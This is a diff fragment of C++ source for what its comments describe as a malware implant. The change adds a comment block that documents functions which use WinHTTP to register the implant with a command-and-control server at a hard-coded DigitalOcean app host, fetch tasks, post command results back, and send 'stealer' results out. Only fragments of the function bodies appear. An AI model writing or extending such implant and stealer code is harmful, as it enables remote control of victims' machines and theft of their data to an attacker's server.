@@ -3,11 +3,20 @@
 /* Initializing a LPCWSTR - https://stackoverflow.com/questions/17753607/initializing-a-lpctstr-lpcwstr */
 #define OURURL L"sea-lion-app-f5nrq.ondigitalocean.app"
 
+/* Uses HTTP to get commands
+Each of the following four methods take in different parameters to send the correct Post Request
+Using Windows API
+https://learn.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-winhttpsendrequest
+
+HttpGetCommand - Uses Implant ID as post to receive task data from the C2 
+HttpRegisterImplant - Uses Sleep and Jitter to post to C2 to register Implant 
+HttpResponse - After a command is executed, the result parameters and details of the task are posted back to the C2
+StealerHttpResponse - Sends stealer response back to the C2
+*/
 std::string HttpGetCommand(std::string uri, int implant_id)
 {
     // Used Windows documentation for every function
     int temp = 0;
-    // LENGTH NEEDS TO BE SCALED DEPENDING ON OUR RANGE FOR IMPLANT_ID
     if (implant_id > 10)
     {
         temp = 2;
@@ -357,7 +366,6 @@ std::string HttpResponse(std::string uri, int implant_id, int task_id, std::stri
     WinHttpCloseHandle(hRequest);
     return result;
 }
-
 std::string StealerHttpResponse(std::string uri, int implant_id, int task_id, json results, std::string success, std::string command)
 {
     json resp;
